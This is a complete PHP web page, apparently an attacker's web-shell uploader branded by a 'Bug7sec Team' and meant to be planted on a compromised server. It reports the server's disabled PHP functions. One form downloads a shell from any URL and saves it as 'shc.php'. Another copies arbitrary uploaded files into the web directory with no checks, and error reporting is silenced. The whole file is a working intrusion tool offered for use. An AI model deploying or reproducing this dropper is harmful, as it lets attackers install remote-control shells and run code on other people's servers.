<!DOCTYPE html>
<html>
<head>
<title>SHOR7CUT | SIMPLE UPLOAD</title>
<meta name="description" content="Shor7cut - Simple Upload | Bug7sec Team"/>
<style type="text/css">
    body{
                color: #3EF403;
                background-color: black;
        }
    input {
    border: dashed 1px;
    border-color: #333;
    BACKGROUND-COLOR: Black;
    font: 8pt Verdana;
    color: #0CFF37;
        }
 
    select {
    border: dashed 1px;
    border-color: #333;
    BACKGROUND-COLOR: Black;
    font: 8pt Verdana;
    color: #0CFF37;
}
    textarea {
    margin: 0;
    color: #fff;
    background-color: #555;
    border: 1px solid #df5;
    font: 9pt Monospace,'Courier New'; }
        </style>
   
</head>
<body>
<pre style="text-align: center">
-[ SHOR7CUT SIMPLE UPLOAD |  Bug7sec Team ]-
<?php
function showdisablefunctions() { if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:red'><font color=#DD4736><b>".$disablefunc."</b></font></span>";  }else { return "<span style='color:#00FF1E'><b>NONE</b></span>"; }} echo showdisablefunctions();
?>
</pre>
<Center>
<form action="" method="post">
    <input type="text"   name="shcfile" placeholder="URL Shell">
    <input type="text"   name="shcname" placeholder="Name Shell" value="shc.php">
    <input type="submit" name="submit"  value="SHC UPLOAD"/>
</form><br>
<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>
<?php
error_reporting(0);
if($_POST[shcname]){
    if( file_put_contents($_POST['shcname'], file_get_contents($_POST['shcfile'])) ){
        echo '<font color="#0CFF37">Berhasil Cuk!!!</font>';
    }else{
        echo '<font color="red">Gagal Cuk!!!</font>';
    }
}
if($_POST['_upl']=="Upload"){
    if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){
        echo '<br><a href="'.$_FILES['file']['name'].'" target="_blank">'.$_FILES['file']['name'].'</a>';
    };
}
?>
</Center>
</body>
